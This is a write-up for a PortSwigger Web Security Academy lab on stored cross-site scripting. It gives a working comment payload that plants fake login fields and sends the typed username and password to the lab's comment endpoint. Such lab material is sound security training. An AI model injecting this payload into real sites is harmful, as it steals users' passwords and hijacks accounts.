# XSS LAB 23 - Exploiting cross-site scripting to capture passwords

## Manual Solution

### 1. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 2. Creating a comment:
- Comment: `<script>alert('XSS')</script>`
- Name: `Anything`
- Email: `Anything@anything.com`
- Website: `https://www.anything.com`
- Submit to comment and an alert pop-up appears.
- This confirms that we can inject arbitrary JavaScript code

### 3. Inspecting the Form Elements.
- Inspect the post page. You'll see a form element.
```html
 <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
    <input required type="hidden" name="csrf" value="KYE5AGcZujltNAyFT9tcICBwoW3y1lEC">
    <input required type="hidden" name="postId" value="6">
    <label>Comment:</label>
    <textarea required rows="12" cols="300" name="comment"></textarea>
        <label>Name:</label>
        <input required type="text" name="name">
        <label>Email:</label>
        <input required type="email" name="email">
        <label>Website:</label>
        <input pattern="(http:|https:).+" type="text" name="website">
        <button class="button" type="submit">Post Comment</button>
</form>
```
- There are six required fields. CSRF token and POST ID are hidden.
- We can retrieve CSRF token using:
```js
document.getElementsByName("csrf")[0].getAttribute('value');
```

### 4. Stealing credentials
- We can inject and execute any JavaScript code we want.
- Create a comment
    - Name: `Anything`
    - Email: `Anything@anything.com`
    - Website: `https://www.anything.com`
    - Comment: 

    ```js
        <input name="username" id="username">
        <input type="password" name="password" onchange="credentials()">

        <script>
            function credentials() {
                let csrf_token = document.getElementsByName("csrf")[0].value;
                let username = document.getElementsByName("username")[0].value;
                let password = document.getElementsByName("password")[0].value;
            
                let data = new FormData();
                data.append('postId', '1');
                data.append('csrf', csrf_token);
                data.append('comment', username + ' ' + password);
                data.append('name', 'kurabiye');
                data.append('email', 'asd@asd.com');
                data.append('website', 'https://www.google.com');
                
                fetch('https://0a460096043f826f80bab230004400cb.web-security-academy.net/post/comment', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: data
                });
            }
        </script>
    ```
    - When a victim visits the post page this JavaScript code automatically creates username and password fields.
    - Victim enters username and password as part of the lab simulation. The username and password are then reflected on the post page.
    - The `fetch` function sends a POST request to the relevant URL. This function has a parameter called body which is used to send data to the server.
    - The data variable stores form data. We use `data.append` to add our desired data to the form data.

### 5. Logging in as Admin:
- After submitting the injected comment you will see the admin's username and password.
- Log in as the admin and solve the lab.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_23.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```